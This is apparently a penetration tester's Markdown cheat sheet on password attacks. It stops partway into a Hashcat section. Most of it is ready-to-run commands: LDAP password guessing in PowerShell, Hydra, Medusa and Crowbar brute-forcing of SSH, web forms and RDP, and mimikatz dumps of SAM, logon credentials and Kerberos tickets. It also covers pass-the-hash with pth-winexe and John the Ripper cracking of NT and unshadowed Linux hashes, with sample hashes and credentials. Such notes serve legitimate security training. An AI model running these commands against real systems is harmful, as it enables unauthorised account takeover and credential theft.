# Passwords

[TOC]

Cracking, Spraying, Brute-forcing, etc. Note that RDP and SMB do not support multiple threads well, and shouldn't be attacked in parallel.

## Low and Slow Password Guessing

Attack against LDAP users.

```powershell
# Show domain account policy on Windows. 
# Note the lockout threshold.
net accounts

# Powershell script
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")

```



## THC-Hydra

### Attacking SSH

Options:

* `-l`  user to attack
* `-P`  wordlist to use
* `-t`  number of threads
* `-V`  verbose output
* `protocol://IP` - target protocol and IP address

```bash
# Example use:
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1

hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.128.131:22 -t 4 -V
```

### HTTP POST attack

```bash
# Help
hydra http-form-post -U
# Syntax: <url>:<form parameters>:<condition string>[:<optional>[:<optional>]

# Example use:
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

### Using Hydra with a proxy

```bash
HYDRA_PROXY=connect://127.0.0.1:8080
export HYDRA_PROXY

# and remove:
unset HYDRA_PROXY
```





## Medusa

Brute forcer. Options:

* `-m DIR:/admin` - attack an htaccess-protected URL, the `admin` directory.
* `-h 10.11.0.22` - target host
* `-u admin` - user: admin
* `-P /usr/share/wordlists/rockyou.txt` - wordlist to use
* `-M http` - use the HTTP authentication scheme

```bash
# Example use:
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin

# Medusa also works with other network protocols, which can be listed with:
medusa -d
```





## Crowbar (RDP)

Designed to use SSH keys rather than passwords. Options:

* `-b` - specify protocol
* `-s` - target server
* `-u` - username
* `-c` - wordlist
* `-n` - number of threads

```bash
# Example use:
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```





## hashid

Identifies the type of hash it is given.

```bash
hashid 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
```





## mimikatz

Requires administrator access and a two step process - first enable one process to tamper with another (debug) and second to elevate to SYSTEM access.

```powershell
mimikatz.exe             # Run mimikatz
privilege::debug         # enable 1 process to tamper with another
token::elevate           # Get SYSTEM access
token::list              # Tokens for all users logged in - maybe admin on another machine?
lsadump::sam             # Dump contents of SAM database
sekurlsa::logonpasswords # Dump credentials of all logged-on users (using Sekurlsa module)
kerberos::list /export   # Dump Kerberos tickets
```





## Pass the hash
https://blog.ropnop.com/practical-usage-of-ntlm-hashes/

This uses the Passing-The-Hash toolkit. Options:

* `-U`, `--user=DOMAIN/USERNAME%HASH` - Set the network username

```bash
# User: admin, Hash: 2892d26cdf84d7a70e2eb3b9f05c425e
# Blank LM portion required: aad3b435b51404eeaad3b435b51404ee - I don't think this 
# changes between machines. Example Use:
pth-winexe -U admin%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.193.10 cmd



pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.193.10 cmd
```




## John the Ripper

### Windows Hashes

Given the file:

```bash
# cat hash.txt - from Windows
WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028
Offsec:2892d26cdf84d7a70e2eb3b9f05c425e
```

Attack with:

```bash
sudo john hash.txt --format=NT

# Or attack using a wordlist and john's mutating rules
sudo john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

### Linux Hashes
To crack a linux hash, you need an unshadowed file. This can bee created, provided you have access to `passwd` and `shadow`.

```bash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

# Example output > hash.txt
victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrB
BNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash
```

Now attack with:

```bash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```





## Hashcat

Benchmark the computer and confirm that the GPU is being utilized with `hashcat